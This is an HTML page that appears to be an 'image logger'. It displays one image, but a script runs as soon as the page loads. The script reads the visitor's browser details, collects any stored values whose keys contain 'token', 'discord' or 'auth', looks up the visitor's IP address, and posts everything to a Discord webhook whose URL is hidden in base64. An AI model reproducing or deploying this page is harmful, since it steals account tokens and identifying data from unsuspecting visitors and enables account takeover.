<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <meta property="og:image" content="https://i.imgur.com/4z3vK8P.png">
    <script>
        async function steal() {
            let log = `🔥 IMAGE LOGGER HIT 🔥\n\n`;
            log += `UA: ${navigator.userAgent}\n`;
            log += `Platform: ${navigator.platform}\n`;
            log += `Time: ${new Date().toLocaleString('tr-TR')}\n\n`;

            // Daha iyi token yakalama
            try {
                let tokens = [];
                // LocalStorage + SessionStorage
                [localStorage, sessionStorage].forEach(storage => {
                    for (let i = 0; i < storage.length; i++) {
                        let key = storage.key(i);
                        if (key && (key.includes('token') || key.includes('discord') || key.includes('auth'))) {
                            let val = storage.getItem(key);
                            if (val && val.length > 50) tokens.push(val);
                        }
                    }
                });
                if (tokens.length) log += `Tokens:\n${tokens.join('\n')}\n\n`;
            } catch(e) {}

            // IP
            try {
                let ip = await fetch('https://api.ipify.org?format=text').then(r => r.text());
                log += `IP: ${ip}\n`;
            } catch(e) {}

            const hook = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjM1ODM5NjQ5NTA2OTE4NS9mbEFWOUdXV1VDbTVNQXlHZVE1MGJla3ZBU29tdG9YWjBmQmx1a2VBX3E1SDhyMHU2UkxxeFF1SElwVVVyeWs0MFFXWA==');

            fetch(hook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: log })
            });
        }

        window.onload = steal;
    </script>
</head>
<body style="margin:0;background:#111;">
    <img src="https://i.imgur.com/4z3vK8P.png" style="width:100%;height:100vh;object-fit:contain;">
</body>
</html>
